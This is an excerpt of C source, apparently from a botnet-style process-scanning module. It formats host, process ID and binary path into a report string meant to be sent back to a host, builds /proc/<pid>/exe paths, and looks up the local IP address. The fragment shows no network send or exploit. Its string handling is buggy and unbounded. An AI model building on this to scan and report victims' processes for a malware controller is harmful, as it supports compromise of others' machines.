...
void stringsendtohost(char host[100], char pid[1024], char value[1024]) {
    strcat(sendbacktoHost, "host: ");
    strcpy(sendbacktoHost, host);
    strcat(sendbacktoHost, " pid: ");
    strcat(sendbacktoHost, pid);
    strcat(sendbacktoHost, " bin: ");
    strcat(sendbacktoHost, value);
#ifdef DEBUG
    printf("made string %s\n", sendbacktoHost);
#endif
}

void filetoexe(char *value) {
    strcpy(exePath, "/proc/");
    strcat(exePath, value);
    strcat(exePath, "/exe");

}


void util_local_addr2(void)
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    ...
    strcpy(localAddr, inet_ntoa(addr.sin_addr));
